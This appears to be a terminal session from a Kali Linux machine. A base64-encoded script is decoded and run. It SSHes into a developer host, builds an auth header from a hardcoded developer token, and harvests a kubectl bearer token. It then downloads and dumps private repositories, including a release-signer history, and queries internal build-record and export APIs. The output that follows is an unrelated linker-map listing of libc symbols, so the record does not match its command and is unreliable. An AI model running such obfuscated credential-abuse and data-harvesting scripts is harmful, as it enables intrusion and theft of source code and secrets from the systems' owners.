@@ -1,0 +1,509 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/f5.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCJSRU1PVEUiIDI+JjEgfCB0YWlsIC01MDAKc2V0ICtlCkNBPSRIT01FLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9IkF1dGhvcml6YXRpb246IEJhc2ljICQocHJpbnRmICJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIiB8IGJhc2U2NCAtdzApIgpjZCAkSE9NRSAmJiBybSAtcmYgcmVwb3NfazA1ICYmIG1rZGlyIHJlcG9zX2swNSAmJiBjZCByZXBvc19rMDUKZm9yIHIgaW4gcG9saWN5LWNvbXBpbGVyIHJlbGVhc2Utc2lnbmVyLWhpc3RvcnkgY29ubmVjdG9yLWFyY2hpdmU7IGRvCiAgY3VybCAtc1MgLW0gMzAgLS1jYWNlcnQgJENBIC1IICIkQSIgLW8gJHIuemlwICJodHRwczovL3NvdXJjZS5rZXBsZXJvcHMudGVzdC9hcGkvdjEvcmVwb3MvZmllbGRrZXN0LyRyL2FyY2hpdmUvbWFpbi56aXAiCiAgbWtkaXIgLXAgJHI7IHVuemlwIC1xbyAkci56aXAgLWQgJHIgMj4vZGV2L251bGwgfHwgZWNobyAidW56aXAgZmFpbCAkciIKICBlY2hvICI9PT09PSBUUkVFICRyID09PT09IgogIGZpbmQgJHIgLXR5cGUgZiB8IHNlZCAicyNeJHIvIyMiIHwgc29ydApkb25lCmVjaG8gIj09PT09IEFMTCBURVhUIEdSRVAgcmVjb25jaWxlL3NlbGVjdGlvbi90ZW5hbnQvYmluZGluZy9tYW5pZmVzdCA9PT09PSIKZ3JlcCAtckluICJyZWNvbmNpbGVcfHRlbmFudC1wYWNrYWdlXHxzZWxlY3RlZF92ZXJzaW9uXHxzZWxlY3Rpb25fcmVjb3JkXHxwYXJ0aXRpb25fYmluZGluZ1x8cm9sbGJhY2tfc2xvdFx8cmVsZWFzZV9tYW5pZmVzdFx8cmVjb25jaWxpYXRpb24iIC4gMj4vZGV2L251bGwgfCBoZWFkIC04MAplY2hvICI9PT09PSBQT0xJQ1kgQ09NUElMRVIgRklMRVMgPT09PT0iCmZvciBmIGluICQoZmluZCBwb2xpY3ktY29tcGlsZXIgLXR5cGUgZiB8IHNvcnQpOyBkbyBlY2hvICIjIyMjIyAkZiI7IGNhdCAiJGYiOyBlY2hvOyBkb25lCmVjaG8gIj09PT09IFJFTEVBU0UgU0lHTkVSIEZJTEVTID09PT09Igpmb3IgZiBpbiAkKGZpbmQgcmVsZWFzZS1zaWduZXItaGlzdG9yeSAtdHlwZSBmIHwgc29ydCk7IGRvIGVjaG8gIiMjIyMjICRmIjsgY2F0ICIkZiI7IGVjaG87IGRvbmUKZWNobyAiPT09PT0gQ0xPVUQgQlVJTEQgUkVDT1JEIEJMRC1SRUwtNzQyID09PT09IgpKV1Q9JChrdWJlY3RsIGNvbmZpZyB2aWV3IC0tcmF3IC1vIGpzb25wYXRoPSd7LnVzZXJzWzBdLnVzZXIudG9rZW59JykKZm9yIGIgaW4gQkxELVJFTC03NDIgQkxELTE4NDIgQkxELVJFTC03NDEgQkxELVJFTC02OTg7IGRvIGVjaG8gIi0tLSAkYiI7IGN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRKV1QiICJodHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdC9hcGkvYnVpbGQtcmVjb3Jkcy8kYiIgLXcgIiBbJXtodHRwX2NvZGV9XSI7IGVjaG87IGRvbmUKZWNobyAiPT09PT0gQ0xPVUQgRVhQT1JUUyA9PT09PSIKZm9yIGUgaW4gRVhQLTI4NDE7IGRvIGZvciBzdWYgaW4gIiIgL2RlZmluaXRpb24gL3JldmlzaW9ucyAvaGFuZG92ZXI7IGRvIGVjaG8gIi0tLSAkZSRzdWYiOyBjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkSldUIiAiaHR0cHM6Ly9jbG91ZC1hcGkua2VwbGVyb3BzLnRlc3QvYXBpL2V4cG9ydHMvJGUkc3VmIiAtdyAiIFsle2h0dHBfY29kZX1dIjsgZWNobzsgZG9uZTsgZG9uZQpSRU1PVEUK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/f5.sh; bash /tmp/f5.sh; echo DONEMARK_1795200848028$((6*7))
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(syscall.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(tsearch.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(writev.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mremap.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(setvmaname.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(sysinfo.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(malloc-hugepages.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcfuncs_l.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wctype_l.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(iswctype_l.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(asprintf_chk.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(chk_fail.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(fortify_fail.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(fprintf_chk.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mbsnrtowcs_chk.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mbsrtowcs_chk.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(read_chk.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(sprintf_chk.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(stack_chk_fail.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wmemcpy_chk.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(memcpy_chk-nonshared.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(memmove_chk-nonshared.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mempcpy_chk-nonshared.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(memset_chk-nonshared.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wmemset_chk-nonshared.o)
+ .bss           0x00000000005e0b78        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-debug.o)
+ .bss           0x00000000005e0b78       0x30 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-debug-symbols.o)
+                0x00000000005e0b78                _r_debug_extended
+                0x00000000005e0b78                _r_debug
+ *fill*         0x00000000005e0ba8        0x8
+ .bss           0x00000000005e0bb0       0x20 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-find_object.o)
+ .bss           0x00000000005e0bd0        0x8 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-load.o)
+ .bss           0x00000000005e0bd8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-misc.o)
+ .bss           0x00000000005e0bd8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-object.o)
+ .bss           0x00000000005e0bd8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-origin.o)
+ .bss           0x00000000005e0bd8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-printf.o)
+ .bss           0x00000000005e0bd8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-setup_hash.o)
+ .bss           0x00000000005e0bd8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-tls.o)
+ .bss           0x00000000005e0bd8        0x1 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-tls_init_tp.o)
+                0x00000000005e0bd8                __nptl_initial_report_events
+ .bss           0x00000000005e0bd9        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-tunables.o)
+ *fill*         0x00000000005e0bd9        0x7
+ .bss           0x00000000005e0be0       0x18 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-cache.o)
+ .bss           0x00000000005e0bf8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-cet.o)
+ .bss           0x00000000005e0bf8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-addr-obj.o)
+ .bss           0x00000000005e0bf8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-early_allocate.o)
+ .bss           0x00000000005e0bf8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-libc.o)
+ *fill*         0x00000000005e0bf8        0x8
+ .bss           0x00000000005e0c00      0x338 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-support.o)
+                0x00000000005e0c00                _dl_clktck
+                0x00000000005e0c08                _dl_sysinfo_map
+                0x00000000005e0c10                _dl_sysinfo_dso
+                0x00000000005e0c18                _dl_scope_free_list
+                0x00000000005e0c20                _dl_stack_cache_lock
+                0x00000000005e0c28                _dl_in_flight_stack
+                0x00000000005e0c30                _dl_stack_cache_actsize
+                0x00000000005e0c40                _dl_stack_cache
+                0x00000000005e0c50                _dl_stack_user
+                0x00000000005e0c60                _dl_stack_used
+                0x00000000005e0c70                _dl_dso_sort_algo
+                0x00000000005e0c78                _dl_hwcap4
+                0x00000000005e0c80                _dl_hwcap3
+                0x00000000005e0c88                _dl_hwcap2
+                0x00000000005e0c90                _dl_hwcap
+                0x00000000005e0c98                _dl_phnum
+                0x00000000005e0ca0                _dl_phdr
+                0x00000000005e0ca8                _dl_auxv
+                0x00000000005e0cb0                _dl_initfirst
+                0x00000000005e0cb8                _dl_init_all_dirs
+                0x00000000005e0cc0                _dl_all_dirs
+                0x00000000005e0cc8                _dl_inhibit_cache
+                0x00000000005e0cd0                _dl_minsigstacksize
+                0x00000000005e0ce0                _dl_x86_cpu_features
+                0x00000000005e0ee8                _dl_x86_feature_control
+                0x00000000005e0eec                _dl_x86_feature_1
+                0x00000000005e0ef0                _dl_bind_not
+                0x00000000005e0ef8                _dl_origin_path
+                0x00000000005e0f00                _dl_profile_map
+                0x00000000005e0f08                _dl_inhibit_rpath
+                0x00000000005e0f10                _dl_verbose
+                0x00000000005e0f14                _dl_dynamic_weak
+                0x00000000005e0f18                _dl_lazy
+                0x00000000005e0f1c                _dl_debug_mask
+                0x00000000005e0f20                _dl_platformlen
+                0x00000000005e0f28                _dl_platform
+ .bss           0x00000000005e0f38        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-sysdep.o)
+ .bss           0x00000000005e0f38        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(enbl-secure.o)
+ .bss           0x00000000005e0f38        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(libc_early_init.o)
+ .bss           0x00000000005e0f38        0xc /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(init-first.o)
+                0x00000000005e0f38                __libc_argv
+                0x00000000005e0f40                __libc_argc
+ *fill*         0x00000000005e0f44       0x1c
+ .bss           0x00000000005e0f60       0x68 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(findlocale.o)
+                0x00000000005e0f60                _nl_locale_file_list
+ *fill*         0x00000000005e0fc8       0x18
+ .bss           0x00000000005e0fe0       0xd0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(loadarchive.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(loadlocale.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-address.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-collate.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-ctype.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-identification.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-measurement.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-messages.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-monetary.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-name.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-numeric.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-paper.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-telephone.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(C-time.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(SYS_libc.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(coll-lookup.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(localename.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dcgettext.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(setjmp.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(sigjmp.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(sigaction.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(libc_sigaction.o)
+ .bss           0x00000000005e10b0        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(sigprocmask.o)
+ .bss           0x00000000005e10b0       0x14 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(setenv.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(addmul_1.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_done.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(snprintf.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(vfprintf-internal.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(errlist.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(errlist-data.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(errname.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf-parsemb.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(filedoalloc.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(iogetline.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(ioseekoff.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(iovsprintf.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wfileops.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(vasprintf.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(cancellation.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(cleanup_compat.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(elision-conf.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(elision-lock.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(elision-unlock.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(futex-internal.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pthread_mutex_conf.o)
+ .bss           0x00000000005e10c4        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pthread_sigmask.o)
+ *fill*         0x00000000005e10c4       0x1c
+ .bss           0x00000000005e10e0       0x58 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(vars.o)
+                0x00000000005e10e0                __default_pthread_attr_lock
+                0x00000000005e1100                __default_pthread_attr
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(scratch_buffer_grow_preserve.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(scratch_buffer_set_array_size.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(memmem.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(stpncpy.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strndup.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strrchr.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strsep.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strspn.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(stpncpy-avx2.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(stpncpy-avx2-rtm.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(stpncpy-evex.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(stpncpy-sse2-unaligned.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strrchr-avx2.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strrchr-avx2-rtm.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strrchr-evex.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strrchr-sse2.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strspn-sse4.o)
+ .bss           0x00000000005e1138        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strspn-generic.o)
+ .bss           0x00000000005e1138        0x8 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mbsrtowcs.o)
+ .bss           0x00000000005e1140        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mbsrtowcs_l.o)
+ .bss           0x00000000005e1140        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcpncpy.o)
+ .bss           0x00000000005e1140        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcschr.o)
+ .bss           0x00000000005e1140        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcsnlen.o)
+ .bss           0x00000000005e1140        0x8 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcsrtombs.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcpncpy-avx2.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcpncpy-evex.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcpncpy-generic.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcschr-avx2.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcschr-avx2-rtm.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcschr-evex.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcschr-sse2.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcsnlen-avx2.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcsnlen-avx2-rtm.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcsnlen-evex.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcsnlen-sse4_1.o)
+ .bss           0x00000000005e1148        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcsnlen-generic.o)
+ .bss           0x00000000005e1148        0x8 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mktime.o)
+ *fill*         0x00000000005e1150       0x10
+ .bss           0x00000000005e1160       0x84 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(tzset.o)
+                0x00000000005e1160                timezone
+                0x00000000005e1160                __timezone
+                0x00000000005e1168                daylight
+                0x00000000005e1168                __daylight
+ *fill*         0x00000000005e11e4        0x4
+ .bss           0x00000000005e11e8       0x78 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(tzfile.o)
+                0x00000000005e11e8                __use_tzfile
+                0x00000000005e1238                __libc_tzfile_freemem_ptr
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(lc-time-cleanup.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(rewinddir.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(getdents64.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(fdopendir.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(sched_cpucount.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(sysconf.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(fstatat64.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(isatty.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(stat64.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pread64_nocancel.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(tcgetattr.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(getrlimit64.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(getclktck.o)
